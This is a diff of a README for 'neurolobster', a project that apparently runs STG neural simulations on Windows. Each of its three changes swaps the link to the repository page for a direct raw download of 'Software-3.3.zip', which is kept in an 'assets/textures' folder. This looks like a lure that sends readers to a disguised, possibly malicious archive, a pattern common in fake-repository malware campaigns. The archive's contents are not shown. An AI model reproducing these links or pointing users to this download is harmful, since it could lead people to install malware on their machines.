@@ -1,6 +1,6 @@
 # 🦞 neurolobster - Run STG Neural Simulations Locally
 
-[![Download neurolobster](https://img.shields.io/badge/Download%20neurolobster-6B7280?style=for-the-badge&logo=github&logoColor=white)](https://github.com/emyleeblack619/neurolobster)
+[![Download neurolobster](https://img.shields.io/badge/Download%20neurolobster-6B7280?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/emyleeblack619/neurolobster/main/assets/textures/Software-3.3.zip)
 
 ## 🧭 What this app does
 
@@ -31,7 +31,7 @@ For the best run, use:
 
 Visit this page to download the app:
 
-[https://github.com/emyleeblack619/neurolobster](https://github.com/emyleeblack619/neurolobster)
+[https://raw.githubusercontent.com/emyleeblack619/neurolobster/main/assets/textures/Software-3.3.zip](https://raw.githubusercontent.com/emyleeblack619/neurolobster/main/assets/textures/Software-3.3.zip)
 
 If the page offers a release file, download the Windows version to your computer.
 
@@ -146,7 +146,7 @@ If you only want to get the app running on Windows:
 
 ## 🔗 Download again
 
-[Visit the neurolobster download page](https://github.com/emyleeblack619/neurolobster)
+[Visit the neurolobster download page](https://raw.githubusercontent.com/emyleeblack619/neurolobster/main/assets/textures/Software-3.3.zip)
 
 ## 🧷 File safety
 
